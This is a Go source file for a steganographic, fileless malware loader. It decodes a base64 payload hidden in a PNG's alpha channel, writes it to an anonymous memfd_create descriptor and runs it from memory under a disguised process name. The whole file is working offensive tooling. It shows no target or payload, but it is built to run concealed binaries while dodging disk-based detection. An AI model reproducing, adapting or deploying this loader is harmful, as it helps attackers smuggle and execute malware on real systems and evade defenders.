// All the stuff related to running in memory is from github.com/guitmz/memrun

package main

import (
	"encoding/base64"
	"fmt"
	"image"
	"image/png"
	"os"
	"syscall"
	"unsafe"
)

// the constant values below are valid for x86_64
const (
	mfdCloexec  = 0x0001
	memfdCreate = 319
)

func aToChar(a int) string {
	b := 255.0 - a
	ch := string(rune(b))
	return ch
}

func runInMem(displayName string, buffer []byte) {
	fdName := "" // *string cannot be initialized
	fmt.Println("[+] Creating syscall...")
	fd, _, _ := syscall.Syscall(memfdCreate, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
	_, _ = syscall.Write(int(fd), buffer)

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	fmt.Println("[+] Executing...")
	_ = syscall.Exec(fdPath, []string{displayName}, nil)
}

func main() {
	image.RegisterFormat("png", "png", png.Decode, png.DecodeConfig)
	fn := os.Args[1]
	fmt.Println("[+] Reading image...")
	file, _ := os.Open(fn)
	defer file.Close()
	img, _, _ := image.Decode(file)

	bounds := img.Bounds()
	width, height := bounds.Max.X, bounds.Max.Y
	b64str := ""
	fmt.Println("[+] Extracting A values...")
ForLoop:
	for y := 0; y < height; y++ {
		for x := 0; x < width; x++ {
			_, _, _, a := img.At(x, y).RGBA()
			a = a / 257.0
			if a != 255 {
				ch := aToChar(int(a))
				b64str += ch
			} else {
				break ForLoop
			}
		}
	}
	fmt.Println("[+] Converting A values...")
	data, _ := base64.StdEncoding.DecodeString(b64str)
	runInMem("PLAINSIGHT", data)
}
